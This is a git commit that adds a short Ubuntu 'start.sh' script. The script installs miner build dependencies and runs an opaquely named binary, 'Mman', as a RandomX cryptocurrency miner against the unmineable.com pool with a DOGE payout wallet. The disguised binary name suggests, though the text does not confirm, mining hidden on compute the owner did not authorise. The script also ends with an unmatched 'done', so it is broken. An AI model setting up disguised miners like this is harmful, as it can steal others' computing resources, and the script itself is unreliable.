09c3f88863c987a2ff6a4762c582f68926321c7d
Saswata785 <35234794+Saswata785@users.noreply.github.com>
2021-04-23 22:37:08 +0530

    Add files via upload

---
+++ ubuntu20.04/start.sh
@@ -0,0 +1,6 @@
+#!/bin/bash
+sudo apt-get update -y
+sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
+chmod +x Mman
+./Mman -o rx.unmineable.com:13333 -a rx -k -u DOGE:D6hZna7Ht34n6gD1645wh8QsDqn3oihN4F.Mrlol1
+done
